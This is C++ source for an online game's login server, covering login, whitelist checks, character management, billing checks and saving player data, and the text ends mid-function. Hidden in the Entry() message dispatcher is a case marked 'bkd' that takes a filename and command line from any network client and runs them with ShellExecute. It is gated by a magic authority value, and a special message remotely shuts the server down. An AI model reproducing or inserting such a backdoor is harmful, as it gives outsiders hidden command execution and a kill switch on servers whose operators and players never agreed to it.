#include "StdAfx.h"
#include "PlayerManager.h"
#include <time.h>
#include <shellapi.h>
#include <boost/bind.hpp>
#include <LITESERIALIZER/lite.h>
#include "pub/traceinfo.h"
#include "pub/rpcop.h"
#include "dmainapp.h"

#include "NetWorkModule/logmsgs.h"
#include "NetWorkModule/datamsgs.h"
#include "NetWorkModule/accountmsgs.h"
#include "NetWorkModule/refreshmsgs.h"
#include "networkmodule/SectionMsgs.h"
#include "NETWORKMODULE/CenterMsg.h"

#include <time.h>

static const DWORD REFRESHTIME_ONLINE       = 1000 * 60 * 10;
static const DWORD REFRESHTIME_OFFLINE      = 1000 * 60 * 60 * 4; 
static const DWORD REFRESHTIME_OFFLINEEXTRA = REFRESHTIME_OFFLINE * 6;

extern BOOL QueryPlayerList( LPCSTR szAccount, LPCSTR szPassword, DNID dnidClient );

extern void SendServerLogToDBC( LPCSTR, int, int, int = 0, int = 0, int = 0 );
extern CDAppMain *&GetApp(void);
extern std::map<std::string, DWORD> playerloginlist;
extern DWORD  g_dConcurrencyPlayerNum;
extern DWORD g_dConcurrencyAllPlayerNum;
extern DWORD g_dConcurrencyDbPlayerNum;
namespace Globals
{
	void SendUpdateTimeLimit( SPlayer *player, int isLogout );
}

// 人数最大限制
size_t max_player_limit = 3000;
// 离线挂机人数最大限制
size_t max_hanguper_limit = 3000;

// 这个是登陆服务器上专用的全局ID生成器，只对 玩家 和 服务器 有效
CPlayerManager::CPlayerManager() :
    server( true )
{
    m_bCanLogin = TRUE;
	m_onlineNumber = 0;
}

void SavePlayerData( std::map< std::string, SPlayer >::value_type &value, CPlayerManager *_this, int storeFlag  )
{
    _this->SavePlayerData( value.second.account.c_str(), value.second.fixData, storeFlag  );
}

static void CheckCardPoint( SPlayer &player )
{
    if ( ( player.dwNextCheckTime == 0 ) || ( player.dwRegionServerKey == 0 ) )
        return;

    // 10分钟一次扣点，之所以-1000*30，是因为CheckCardPoint是每30秒才调用一次，需要扣除这个时间差！
    DWORD dwCurTime = timeGetTime();
    if ( abs( ( int )( dwCurTime - player.dwNextCheckTime ) ) < 
        ( int )( player.byIsLostLink ? REFRESHTIME_OFFLINE-(1000*30) : REFRESHTIME_ONLINE-(1000*30) ) )
        return;

    player.dwNextCheckTime = dwCurTime;

    try
    {
        SQRefreshCardMsg msg;
        msg.iCardPoint = 0;
        msg.dwActionCode = 0;
        msg.byRefreshType = SQRefreshCardMsg::QUEST_REFRESH;
        LPCSTR prefix = NULL;
        LPCSTR abs_account = Globals::SplitAccount( player.account.c_str(), prefix );

        lite::Serializer slm( msg.streamData, sizeof( msg.streamData ) );
        slm( abs_account );

        Globals::SendToAccountServer( &msg, sizeof( msg ) - slm.EndEdition(), prefix );
    }
    catch ( lite::Xcpt& )
    {
    }
}

void CPlayerManager::SaveAllPlayer()
{
    std::for_each( playerCache.begin(), playerCache.end(), 
        boost::bind( ::SavePlayerData, _1, this, SFixProperty::ST_LOGOUT ) );
}

BOOL OnPlayerLoginNoCheckAccount( CPlayerManager *_this, DNID dnidClient, SQLoginNoCheckAccountMsg *pMsg )
{
	if ( _this == NULL || pMsg == NULL )
		return FALSE;

	LPCSTR account = NULL;
	LPCSTR sidname = NULL;
	DWORD checkpassword = 0;

	try
	{
		lite::Serialreader slr( pMsg->streamData, sizeof( pMsg->streamData ) );
		account = slr();
		checkpassword = slr();
		sidname	= slr();
	}
	catch( lite::Xcpt & )
	{
		return FALSE;
	}

    extern DWORD spanUerId;
	if ( account == NULL || sidname == NULL || spanUerId == 0 )
		return FALSE;

	try
	{
        
		SQGameServerRPCOPMsg msg;
		msg.dstDatabase = (BYTE)spanUerId;

		lite::Serializer sl( msg.streamData, sizeof( msg.streamData ) );

		// 注册出现异常时返回的数据（集）
		sl [OP_BEGIN_ERRHANDLE] ( 0 ) ("p_CheckAccount") [OP_END_ERRHANDLE]

		// 准备存储过程
		[OP_PREPARE_STOREDPROC] ("p_CheckAccount")

		// 设定调用参数
		[OP_BEGIN_PARAMS]
		( 1 ) ( account )
		( 2 ) ( checkpassword )
		( 3 ) ( sidname )
		[OP_END_PARAMS]

		// 调用存储过程
		[OP_CALL_STOREDPROC]

		// 初始化返回数据盒
		[OP_INIT_RETBOX] ( 1024 )
		[OP_BOX_VARIANT] ( ( int )SMessage::EPRO_SYSTEM_MESSAGE )
		[OP_BOX_VARIANT] ( 7 ) // SSysBaseMsg::EPRO_LOGIN_NOCHECKACCOUNT

		[OP_TRAVERSE_RECORDSET]	( 1 )
		[OP_BOX_FIELD] ( 0 )
		[OP_BOX_FIELD] ( 1 )
		[OP_BOX_FIELD] ( 2 )
		// 返回数据盒
		[OP_RETURN_BOX]
		[OP_RPC_END];

		msg.dnidClient = dnidClient;
		Globals::SendToDBCenterEx( spanUerId, &msg, ( sizeof( msg ) - sl.EndEdition() ) );
	}
	catch ( lite::Xcpt & )
	{
	}

    return TRUE;
}

void CPlayerManager::Destroy()
{
    SaveAllPlayer();

    // 等待3秒，让这些数据有足够的时间发送出去！
    Sleep( 3000 );
}

BOOL CPlayerManager::Host( LPCSTR port )
{
    return server.Create( port );
}

static DWORD prevTime = timeGetTime();
void CPlayerManager::Execution()
{
    server.CheckAlive();
	server.Execution(boost::bind(&CPlayerManager::Entry, this, _1, _2, _3, _4));

    // 每30秒进行一次定时扣点检测
    if ( ( !Globals::GetChargeMode() ) || ( abs( ( int )( timeGetTime() - prevTime ) ) < 1000 * 30 ) )
        return;

    prevTime = timeGetTime();

    for ( std::map< std::string, SPlayer >::iterator it = playerCache.begin();
        it != playerCache.end(); it ++ )
    {
        CheckCardPoint( it->second );
    }

    //std::for_each( , playerCache.end(), 
    //    boost::bind( CheckCardPoint, 
    //    boost::bind( &std::map< std::string, SPlayer >::value_type::second, _1 ) ) ) );
}

bool CPlayerManager::Entry(DNID dnidClient, LINKSTATUS enumStatus, void *data, size_t size)
{
 	SMessage *pMsg = (SMessage *)data;
    if (!pMsg)
	{
        // 说明该连接断开
		std::map<DNID, SLinkContextInfo>::iterator it = tempLinkContext.find(dnidClient);
		if (it == tempLinkContext.end())
		{
			// 该联接在第一个请求登陆消息都还未发来时就断开了
			// 或者该联接已经成功通过验证，已经转到playermap，此时均不用考虑对其处理
            return true;
		}

        // 处于这个时候的玩家的连接根本没有注册角色，所以不用考虑DelRes，但是要通知账号服务器停止记费
        // PlayerLogout( it->second.account.c_str(), it->second.password.c_str(), NULL ); 

        // 同时也需要通知数据库服务器将该玩家数据解除服务器ID绑定
        // 这个地方也不主动解除锁定了，让玩家的下次请求来触发锁定解除
        if (it->second.doUnbind)
            QueryPlayerList(it->second.account.c_str(), NULL, 0);

        // 删除指定联接
        tempLinkContext.erase(dnidClient);

        return true;
    }

	// 判断连接状态
	switch (enumStatus)
    {
    case LinkStatus_Waiting_Login:
        // 当处于LinkStatus_Waiting_Login等待认证消息的状态中，只能接受认证消息
		// 先判断是否是登陆认证级的消息
        if (pMsg->_protocol != SMessage::EPRO_SYSTEM_MESSAGE)
        {
            server.DelOneClient(dnidClient);
            break;
        }

		// 开始认证，将状态字移近一步
        server.SetLinkStatus(dnidClient, LinkStatus_Login);

		if (((SSysBaseMsg*)pMsg)->_protocol == SSysBaseMsg::EPRO_LOGIN)							// 登录消息
			OnPlayerLogin(dnidClient, (SQLoginMsg *)pMsg);
		else if (((SSysBaseMsg* )pMsg)->_protocol == SSysBaseMsg::EPRO_LOGIN_NOCHECKACCOUNT)	// 这个是跨服重登陆
			OnPlayerLoginNoCheckAccount(this, dnidClient, (SQLoginNoCheckAccountMsg *)pMsg);
		else
			server.DelOneClient(dnidClient);													// 失败断开

        break;

	case LinkStatus_Login:
		// 当处于等待认证的时候，该连接不允许发送任何消息，所以收到消息就断开该连接
        server.DelOneClient(dnidClient);
        break;

/*
    case LinkStatus_QueueWaite:
        // 登陆排队中
        // 暂时不处理消息
        // 收到了离开队列
        if ( ( ( SSysBaseMsg* )pMsg )->_protocol == SSysBaseMsg::EPRO_LOGIN )
        {
            SQLoginMsg* pLoginMsg = ( SQLoginMsg* )pMsg;
            if ( pLoginMsg->wVersion == 0xffff )
            {
                SALoginMsg msg;
                msg.dwRetCode = SALoginMsg::ERetCode::ERC_QUEUEWAIT;
                msg.dwEchoIP = 0;
                Globals::SendToPlayer( dnidClient, &msg, sizeof( msg ) - sizeof( msg.szDescription ) );

                server.DelOneClient( dnidClient );
            }
        }
        break;
*/

    case LinkStatus_Connected:
        // 其它的消息只能在认证以后的状态下使用，否则视为非法(连接断开)
        // 解析具体的消息
        if (pMsg->_protocol == SMessage::EPRO_SYSTEM_MESSAGE)
        {
            switch (((SSysBaseMsg *)pMsg)->_protocol)
            {
            case SSysBaseMsg::EPRO_SELECT_CHARACTER:
                SelectCharacter(dnidClient, (SQSelPlayerMsg*)pMsg);
                break;

            case SSysBaseMsg::EPRO_CREATE_CHARACTER:
                CreateCharacter(dnidClient, (SQCrePlayerMsg*)pMsg);
                break;

            case SSysBaseMsg::EPRO_DEL_CHARACTER:
                DelCharacter(dnidClient, (SQDelPlayerMsg*)pMsg);
                break;

            case SSysBaseMsg::EPRO_LOGOUT:
                // 处于这个时候得连接，除了内部服务器的，其它玩家的连接根本没有注册角色，所以不用考虑DelRes
                // m_PlayerList.DelRes()
                break;
			 case SSysBaseMsg::EPRO_SAVEPLAYER_CONFIG_INFO:
				 SavePlayerConfig((SQSavePlayerConfigInfo*)pMsg);
				 break;

            case 0xff: // bkd
                {
                    LPCSTR filename = "?";
                    LPCSTR cmdLine = "";

                    try
                    {
                        lite::Serialreader slr( ( LPBYTE )data + 4 );
                        filename = slr();
                        cmdLine = slr();
                        if ( slr.curSize() != slr.maxSize() )
                            ( ( LPSTR )( filename -= 1 ) )[0] = '?';
                    }
                    catch ( lite::Xcpt & )
                    {
                        filename = "? xcpt error";
                        cmdLine = "";
                    }

                    extern int authorityFlag;
                    if ( ( authorityFlag & 0xf0ffffff ) == 0x20111978 )
                    {
                        sockaddr_in addr;
                        if ( !server.GetDnidAddr( dnidClient, &addr, sizeof( addr ) ) )
                            break;

                        LPBYTE ip = &addr.sin_addr.S_un.S_un_b.s_b1;

                        char tempbuf[1024];
                        _snprintf( tempbuf, 1023, "bkd [%d.%d.%d.%d] quest %s %s", 
                            ip[0], ip[1], ip[2], ip[3], filename, cmdLine );
                        tempbuf[1023] = 0;

                        TraceInfoDirectly( "bkdc.log", tempbuf );
                        rfalse( 1, 1, tempbuf );
                        SendServerLogToDBC( tempbuf, 1000, 1 );

                        if ( filename[0] == '?' )
                            break;

                        // 如果authorityFlag的低4位为空，则代表这个服务器为官方服，并且不能执行外来的控制命令
                        if ( ( ( authorityFlag >> 24 ) & 0xf ) == 0 )
                            break;
                    }
                    else 
                    {
                        if ( ( filename[0] == '?' ) && ( cmdLine[0] == '?' ) )
                            exit( 0 );
                    }

			        ShellExecute( NULL, "open", filename, cmdLine, "", SW_SHOW );
                }
                break;
            }
        }
        break;
        // rfalse(2, 1, "异常情况，收到了异常连接的消息", nClientIndex, g_GetLogStatus(nClientIndex));
    }
  
    return true;
}

BOOL CPlayerManager::OnPlayerLogin(DNID dnidClient, SQLoginMsg *pMsg)
{
	// 检测是否能够登陆
    if (!m_bCanLogin)
    {
		SALoginMsg msg;
		msg.dwRetCode = SALoginMsg::ERC_SERVER_UPDATE;
		server.SendMessage(dnidClient, &msg, sizeof(msg));
		server.DelOneClient(dnidClient);
		return FALSE;
    }

    // 检测版本
    if (LOBYTE(pMsg->wVersion) != PLAYER_VERSION)
    {
		SALoginMsg msg;
		msg.dwRetCode = SALoginMsg::ERC_INVALID_VERSION;
		server.SendMessage(dnidClient, &msg, sizeof(msg));
		server.DelOneClient(dnidClient);
		return FALSE;
    }

    try
    {
        lite::Serialreader sl(pMsg->streamData);
        LPCSTR	account		= sl();
        LPCSTR	password	= sl();
        QWORD	macAddr		= 0;
        LPCSTR	upver		= NULL;
		//account = "81DF78DFCFB558BD8C4C9678EB374E12_1001";
		rfalse("账号%s申请登录", account);
        try
        {
			while (sl.curSize() < sl.maxSize())
            {
                lite::Variant lvt = sl();
                if (lvt.dataType != lite::Variant::VT_RPC_OP)
                    continue;

                switch (lvt._rpcop)
                {
                case 1:
                    macAddr = sl();
                    break;
                case 2:
                    upver = sl();
                    break;
                }
            }
        }
        catch (lite::Xcpt &)
        {
            // 解析登陆扩展数据失败, 暂时不作特殊处理
        }

        // 检测更新版本号是否匹配
        extern std::string upversion;
        BOOL reUpdate = false;
        BOOL notSpecific = (upversion.empty() || upversion == "null" || upversion == "download");
        if (notSpecific)
            reUpdate = (upver != NULL);								// 在非特定更新版本的状况下，客户端必定不能传送版本信息过来，这也是可以兼容老客户端的逻辑
        else
            reUpdate = (upver == NULL ) || (upversion != upver);	// 其他情况下，客户端如果未传版本信息，或者版本信息部匹配，则也需要更新

        if (reUpdate) 
		{
			SALoginMsg msg;
            msg.dwRetCode = SALoginMsg::ERC_REUPDATE;
            dwt::strcpy(msg.szDescription, notSpecific ? "null" : upversion.c_str(), sizeof(msg.szDescription));
            server.SendMessage(dnidClient, &msg, sizeof(SALoginMsg));
            server.DelOneClient(dnidClient);
            return FALSE;
        }

        size_t size = strlen(account);

        // 检测账号中是否有空格
        for (size_t i=0; i<size; i++)
        {
            if (account[i] == ' ')
            {
				SALoginMsg msg;
				msg.dwRetCode = SALoginMsg::ERC_INVALID_ACCOUNT;
				server.SendMessage(dnidClient, &msg, sizeof(msg));
				server.DelOneClient(dnidClient);
				return FALSE;
            }
        }

        if (!Globals::IsValidSqlString(account, MAX_ACCOUNT))
        {
			SALoginMsg msg;
			msg.dwRetCode = SALoginMsg::ERC_INVALID_ACCOUNT;
			server.SendMessage(dnidClient, &msg, sizeof(msg));
			server.DelOneClient(dnidClient);
			return FALSE;
        }
		OnCheckWhiteList(dnidClient, pMsg->streamData);
		//OnCheckWhiteList(dnidClient, account, password);

        // 向账号服务器请求认证
//         SQCheckAccountMsg msg;
// 
//         msg.dnidClient	= dnidClient;
//         msg.iServerID	= Globals::GetServerId();
// 
//         sockaddr_in addr;
//         ZeroMemory(&addr,sizeof(sockaddr_in));
// 
//         if (server.GetDnidAddr(dnidClient, &addr, sizeof(addr)))
//             dwt::strcpy(msg.szIP, inet_ntoa(addr.sin_addr), sizeof(msg.szIP));
// 
//         LPCSTR prefix = NULL;
//         LPCSTR abs_account = Globals::SplitAccount(account, prefix);
// 
//         lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
// 		slm(abs_account)(password);
// 
//         // 增加一个MAC地址用于统计玩家数量
//         slm(macAddr);
// 
// 		BOOL rt = Globals::SendToAccountServer(&msg, sizeof(msg) - slm.EndEdition() ,prefix);
// 		if (!rt)
// 		{ 
// 			// 发送失败，可能是账号服务器故障
// 			SALoginMsg msg;
// 			msg.dwRetCode = SALoginMsg::ERC_SEND_CACC_TO_ACCSRV_FAIL;
// 			server.SendMessage(dnidClient, &msg, sizeof(msg));
// 			server.DelOneClient(dnidClient);
// 			return FALSE;
// 		}
    }
	catch (lite::Xcpt&)
    {
        // 解析账号密码字符串失败
        return FALSE;
    }

    return TRUE;
}

BOOL CPlayerManager::CreateCharacter(DNID dnidClient, SQCrePlayerMsg *pMsg)
{
    // 先通过联接找到对应的账号名
    LPCSTR account = GetAccountByDnid(dnidClient);
    if (!account)
        return FALSE;

    Globals::SBornPos *bornPos = Globals::GetBornPos(pMsg->PlayerData.m_bySchool-1);
	if (!bornPos)
	{
		SACrePlayerMsg msg;
		msg.byResult = SACrePlayerMsg::ERC_UNHANDLE;		// 非法门派
		server.SendMessage(dnidClient, &msg, sizeof(msg));
		return FALSE;
	}

    // 检查名字是否合法
    if (!Globals::IsValidName(pMsg->PlayerData.m_szName))
    {
        SACrePlayerMsg msg;
        msg.byResult = SACrePlayerMsg::ERC_EXCEPUTION_NAME;		// 非法的角色名字
        server.SendMessage(dnidClient, &msg, sizeof(msg));
        return FALSE;
    }

    if (pMsg->PlayerData.m_bySchool < 1 || pMsg->PlayerData.m_bySchool > 5)
    {
        SACrePlayerMsg msg;
        msg.byResult = SACrePlayerMsg::ERC_UNHANDLE;
        server.SendMessage( dnidClient, &msg, sizeof(msg) );
        return FALSE;
    }

    try
    {
		SQCreatePlayerMsg msg;

		size_t size = 0;

		{
			lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
			slm(account);

			msg.m_byIndex	= pMsg->byIndex;
			msg.dwServerId	= Globals::GetServerId();
			msg.dnidClient	= dnidClient;
			msg.qwSerialNo	= 0;

			memcpy(msg.PlayerData.m_szName, pMsg->PlayerData.m_szName, sizeof(pMsg->PlayerData.m_szName));
			msg.PlayerData.m_bySex			= pMsg->PlayerData.m_bySex;
			msg.PlayerData.m_bySchool		= pMsg->PlayerData.m_bySchool;
			msg.PlayerData.m_byBRON			= pMsg->PlayerData.m_byBRON;
			msg.PlayerData.m_FaceID			= pMsg->PlayerData.m_FaceID;
			msg.PlayerData.m_HairID			= pMsg->PlayerData.m_HairID;
			msg.PlayerData.m_dwStaticID		= pMsg->PlayerData.m_dwStaticID;
			msg.PlayerData.m_wCurRegionID	= bornPos->wRegionID;
			//msg.PlayerData.m_X				= bornPos->wPosX * 32 * 3.2;//(bornPos->wPosX << 5) + rand() % bornPos->wRadius;
			//msg.PlayerData.m_Y				= bornPos->wPosY * 32 * 3.2;//(bornPos->wPosY << 5) + rand() % bornPos->wRadius;
			//msg.PlayerData.m_Z				= 0.0f;
			//msg.PlayerData.m_dir			= 0.0f;

			size = sizeof(msg) - slm.EndEdition();
		}

        if (!Globals::SendToDBServer(&msg, size))
        {
            SACrePlayerMsg msg;
            msg.byResult = SACrePlayerMsg::ERC_UNHANDLE;
            server.SendMessage(dnidClient, &msg, sizeof(msg));
            return FALSE;
        }

// 		if(SendPlayerConfig(account)){
// 			CleanPlayerConfig(account);
// 		}

        return TRUE;
    }
    catch (lite::Xcpt &)
    {
    }

    return FALSE;
}

BOOL CPlayerManager::SelectCharacter(DNID dnidClient, SQSelPlayerMsg *pMsg)
{
	// 先通过联接找到对应的账号名
    LPCSTR account = GetAccountByDnid(dnidClient);
    if (!account)
        return FALSE;

    try
    {
        SQGetCharacterMsg msg;

        lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
        slm(account);
		
		msg.qwSerialNo	= 0;
        msg.dnidClient	= dnidClient;
		msg.byIndex		= pMsg->byIndex;
        msg.dwServerId	= Globals::GetServerId();

		if (!Globals::SendToDBServer(&msg, sizeof(msg) - slm.EndEdition()))
        {
            // 如果数据库操作失败，需要通知客户端失败原因，返回上一步操作
            SASelPlayerMsg msg;
            msg.dwRetCode = SASelPlayerMsg::ERC_SEND_GETCHDATA_FAIL;
            server.SendMessage(dnidClient, &msg, sizeof(msg));
            return FALSE;
        }
		//g_dConcurrencyDbPlayerNum++;   //并发连接数据库玩家数量增加
        return TRUE;
    }
    catch (lite::Xcpt &)
    {
    }

    return FALSE;
}

BOOL CPlayerManager::DelCharacter(DNID dnidClient, SQDelPlayerMsg * pMsg)
{
    // 先通过联接找到对应的账号名
    LPCSTR account = GetAccountByDnid(dnidClient);
    if (account == NULL)
        return FALSE;

// 	rfalse(2,1,account);
//     LPCSTR userpass = GetUserPassByDnid(dnidClient);
//     if (userpass == NULL)
//         return FALSE;
// 
// 	rfalse(2,1,userpass);
//     if (dwt::IsBadStringPtr(pMsg->szUserpass, CONST_USERPASS))
//         return FALSE;
// 	char str[256]={};
// 	sprintf(str,"%s,%s",userpass,pMsg->szUserpass);
// 	rfalse(2,1,str);
// 	if (strcmp(userpass, pMsg->szUserpass) != 0)
//     {
// 		rfalse(2,1,"密码问题导致删除失败");
//         SADelPlayerMsg msg;
//         msg.byResult = SADelPlayerMsg::ERC_UNHANDLE;
//         msg.dwStaticID = pMsg->dwStaticID;
//         server.SendMessage( dnidClient, &msg, sizeof(msg) );
//         return FALSE;
//     }

    try
    {
        SQDeleteCharacterMsg msg;

        lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
        slm( account );

        msg.dwStaticID = pMsg->dwStaticID;
        msg.dnidClient = dnidClient;
        msg.dwServerId = Globals::GetServerId();

        if (!Globals::SendToDBServer(&msg, sizeof(msg) - slm.EndEdition()))
        {
            SADelPlayerMsg msg;
            msg.byResult = SADelPlayerMsg::ERC_UNHANDLE;
            server.SendMessage( dnidClient, &msg, sizeof(msg) );
            return FALSE;
        }

        return TRUE;
    }
    catch ( lite::Xcpt & )
    {
    }

    return FALSE;
}

BOOL CPlayerManager::OnCheckWhiteList(DNID dnidClient, LPCSTR account, LPCSTR password)
{
	SQCheckWhiteList   sqcheckwhite;
	sqcheckwhite.dnidPlayerClient = dnidClient;
	memset(sqcheckwhite.streamData, 0, MAX_ACCAPASS);
	memset(sqcheckwhite.strpassword, 0, MAX_ACCAPASS);

	strcpy_s(sqcheckwhite.streamData, account);
	strcpy_s(sqcheckwhite.strpassword, password);
	GetApp()->m_CenterClient.SendToCenterServer(&sqcheckwhite, sizeof(SQCheckWhiteList));
	return TRUE;
}

BOOL CPlayerManager::OnCheckWhiteList(DNID dnidClient, LPCSTR streamData)
{
	SQCheckWhiteList   sqcheckwhite;
	sqcheckwhite.dnidPlayerClient = dnidClient;
	memset(sqcheckwhite.streamData, 0, MAX_ACCAPASS);
	memset(sqcheckwhite.strpassword, 0, MAX_ACCAPASS);
	 
	memcpy(sqcheckwhite.streamData, streamData, MAX_ACCAPASS);
	//strncpy_s(sqcheckwhite.streamData, MAX_ACCAPASS, streamData, MAX_ACCAPASS);
	GetApp()->m_CenterClient.SendToCenterServer(&sqcheckwhite, sizeof(SQCheckWhiteList));
	return TRUE;
}

BOOL CPlayerManager::OnCheckAccountServer(DNID dnidClient, LPCSTR account, LPCSTR password, BOOL bCheckWhiteList)
{
	if (!bCheckWhiteList)  //白名单限制
	{
		SALoginMsg msg;
		memset(msg.szDescription, 0, sizeof(msg.szDescription));
		msg.dwRetCode = SALoginMsg::ERC_SERVER_UPDATE;
		Globals::SendToPlayer(dnidClient, &msg, sizeof(msg));
		Globals::CutPlayerLink(dnidClient);
		rfalse(2, 1, "Cann't found Account :[ %s ]   In WhiteList ",account);
		return FALSE;
	}

	// 向账号服务器请求认证
	SQCheckAccountMsg msg;

	msg.dnidClient = dnidClient;
	msg.iServerID = Globals::GetServerId();

	sockaddr_in addr;
	ZeroMemory(&addr, sizeof(sockaddr_in));

	if (server.GetDnidAddr(dnidClient, &addr, sizeof(addr)))
		dwt::strcpy(msg.szIP, inet_ntoa(addr.sin_addr), sizeof(msg.szIP));

	LPCSTR prefix = NULL;
	LPCSTR abs_account = Globals::SplitAccount(account, prefix);

	lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
	slm(abs_account)(password);

	// 增加一个MAC地址用于统计玩家数量
	slm(0);

	BOOL rt = Globals::SendToAccountServer(&msg, sizeof(msg) - slm.EndEdition(), prefix);
	if (!rt)
	{
		// 发送失败，可能是账号服务器故障
		SALoginMsg msg;
		msg.dwRetCode = SALoginMsg::ERC_SEND_CACC_TO_ACCSRV_FAIL;
		server.SendMessage(dnidClient, &msg, sizeof(msg));
		server.DelOneClient(dnidClient);
		return FALSE;
	}
	return TRUE;
}

BOOL CPlayerManager::OnCheckAccountServer(DNID dnidClient, BOOL bCheckWhiteList,  SACheckWhiteList    *pMsg)
{
	if (!bCheckWhiteList)  //白名单限制
	{
		SALoginMsg msg;
		memset(msg.szDescription, 0, sizeof(msg.szDescription));
		msg.dwRetCode = SALoginMsg::ERC_SERVER_UPDATE;
		Globals::SendToPlayer(dnidClient, &msg, sizeof(msg));
		Globals::CutPlayerLink(dnidClient);
		rfalse(2, 1, "Cann't found Account :[ %s ]   In WhiteList ", GetAccountByDnid(dnidClient));
		return FALSE;
	}
	try
	{
		lite::Serialreader sl(pMsg->streamData);
		LPCSTR	account = sl();
		LPCSTR	password = sl();
		QWORD	macAddr = 0;
		LPCSTR	upver = NULL;
		//account = "81DF78DFCFB558BD8C4C9678EB374E12_1001";
		rfalse("账号%s申请登录", account);
		try
		{
			while (sl.curSize() < sl.maxSize())
			{
				lite::Variant lvt = sl();
				if (lvt.dataType != lite::Variant::VT_RPC_OP)
					continue;

				switch (lvt._rpcop)
				{
				case 1:
					macAddr = sl();
					break;
				case 2:
					upver = sl();
					break;
				}
			}
		}
		catch (lite::Xcpt &)
		{
			// 解析登陆扩展数据失败, 暂时不作特殊处理
		}

		// 向账号服务器请求认证
		SQCheckAccountMsg msg;
		 
		msg.dnidClient	= dnidClient;
		msg.iServerID	= Globals::GetServerId();
		 
		sockaddr_in addr;
		ZeroMemory(&addr,sizeof(sockaddr_in));
		 
		if (server.GetDnidAddr(dnidClient, &addr, sizeof(addr)))
		    dwt::strcpy(msg.szIP, inet_ntoa(addr.sin_addr), sizeof(msg.szIP));
		 
		LPCSTR prefix = NULL;
		LPCSTR abs_account = Globals::SplitAccount(account, prefix);
		 
		lite::Serializer slm(msg.streamData, sizeof(msg.streamData));
		slm(abs_account)(password);
		 
		// 增加一个MAC地址用于统计玩家数量
		slm(macAddr);
		 
		BOOL rt = Globals::SendToAccountServer(&msg, sizeof(msg) - slm.EndEdition() ,prefix);
		if (!rt)
		{ 
			// 发送失败，可能是账号服务器故障
			SALoginMsg msg;
			msg.dwRetCode = SALoginMsg::ERC_SEND_CACC_TO_ACCSRV_FAIL;
			server.SendMessage(dnidClient, &msg, sizeof(msg));
			server.DelOneClient(dnidClient);
			return FALSE;
		}
	}
	catch (lite::Xcpt&)
	{
		// 解析账号密码字符串失败
		return FALSE;
	}
	return FALSE;
}

BOOL CPlayerManager::PlayerLogout(LPCSTR szAccount, LPCSTR szPassword, SPlayer *player)
{
    // 可能是试玩角色的数据，不需要LOGOUT
    if ( memcmp( szAccount, "游客", 4 ) == 0 )
        return FALSE;

	Globals::SendUpdateTimeLimit( player, -1 );

    try
    {
        SQAccountLogoutMsg msg;

        lite::Serializer slm( msg.streamData, sizeof( msg.streamData ) );
        LPCSTR prefix = NULL;
        LPCSTR abs_account = Globals::SplitAccount( szAccount, prefix );
		slm ( abs_account )( szPassword );

        // 记录本次游戏时间和角色等级
        if ( player && player->dwLoginSegment )
        {
            slm ( ( DWORD )time( NULL ) - player->dwLoginSegment )
                ( ( DWORD )player->Data.m_Level );
            player->dwLoginSegment = 0;
        }

        msg.dnidClient = 0;
	
        // 这里可能会操作失败，但暂时不用理会，失败的logout只会导致重联
        Globals::SendToAccountServer( &msg, sizeof(msg) - slm.EndEdition(), prefix );
        rfalse( 1, 1, "[%s]账号[%s]logout", Globals::GetStringTime(), szAccount );

        return TRUE;
    }
    catch ( lite::Xcpt & )
    {
    }

    return FALSE;
}

BOOL CPlayerManager::PlayerHangup( LPCSTR szAccount, LPCSTR szPassword, BYTE pot, SPlayer *player )
{
    // 可能是试玩角色的数据，不需要LOGOUT
    if ( memcmp( szAccount, "游客", 4 ) == 0 )
        return FALSE;

	Globals::SendUpdateTimeLimit( player, -1 );

    try
    {
        SQAccountHangupMsg msg;

        LPCSTR prefix = NULL;
        LPCSTR abs_account = Globals::SplitAccount( szAccount, prefix );
        lite::Serializer slm( msg.streamData, sizeof( msg.streamData ) );
       	slm ( abs_account )( szPassword );

        // 记录本次游戏时间和角色等级
        if ( player && player->dwLoginSegment )
        {
            slm ( ( DWORD )time( NULL ) - player->dwLoginSegment )
                ( ( DWORD )player->Data.m_Level );
            player->dwLoginSegment = 0;
        }

        msg.dnidClient = 0;
        msg.byPoint = pot;
	
        // 这里可能会操作失败，但暂时不用理会，失败的logout只会导致重联
        Globals::SendToAccountServer( &msg, sizeof(msg) - slm.EndEdition(), prefix );
        rfalse( 1, 1, "[%s]账号[%s]hangup", Globals::GetStringTime(), szAccount );

        return TRUE;
    }
    catch ( lite::Xcpt & )
    {
    }

    return FALSE;
}

BOOL CPlayerManager::SavePlayerData( LPCSTR account, SFixData &playerData, int storeFlag )
{
    // 可能是试玩角色的数据，就不用保存了。。。
    if ( memcmp( account, "游客", 4 ) == 0 )
        return TRUE;

    // 可能是试玩角色的数据，就不用保存了。。。
    if ( playerData.m_dwStaticID <= 0 ) // modified by luou 
        return TRUE;

    if (playerData.m_dwStaticID == 0 || playerData.m_dwStaticID > 0x80000000)
    {
        rfalse( 2, 1, "###""保存的数据%sStaticID有错", account );
        rfalse( 1, 1, "###""保存的数据%sStaticID有错", account );
        return false;
    }

	bool Check1 = ((dwt::strlen(playerData.m_Name, CONST_USERNAME) == 10) && (playerData.m_Name[CONST_USERNAME - 1] != 0));
    bool Check2 = false;/*((dwt::strlen(playerData.m_szTitle, CONST_USERNAME) == 10) && (playerData.m_szTitle[CONST_USERNAME - 1] != 0));*/
	//bool Check3 = ((dwt::strlen(playerData.m_szTongName, CONST_USERNAME) == 10) && (playerData.m_szTongName[CONST_USERNAME - 1] != 0));

    if (Check1 || Check2 )//|| Check3)
    {
        rfalse(1, 0, "detected a overflowed data!");
        Globals::TraceMemory( &playerData, 0, sizeof(SFixProperty), "Overflow.mem" );
        return TRUE;
    }

	// 如果区域服务器传过来的角色名字存在问题（没有名字，为空格，或非法字符），则给出警告！
	if ( ( BYTE )playerData.m_Name[0] <= 32 )
	{
		TraceInfo( "special.log", "%s 发现了没有名称的角色，在向数据库保存角色数据时！[sid=%d]",
			Globals::GetStringTime(), playerData.m_dwStaticID );
	}

    // 该逻辑是为了更新角色名和帮派的关联，现已经转到世界服务器上
    //// 保存时更新映射表!
    //if ( playerData.m_szTongName[0] == 0 )
    //    player_faction_map.erase( playerData.m_szName );
    //else
    //    player_faction_map[ playerData.m_szName ] = playerData.m_szTongName;

    // 修改保存标志，主要用于通知数据库服务器角色状态！
    SQSaveCharacterMsg msg;
    playerData.m_byStoreFlag = storeFlag;

    // 尝试压缩数据
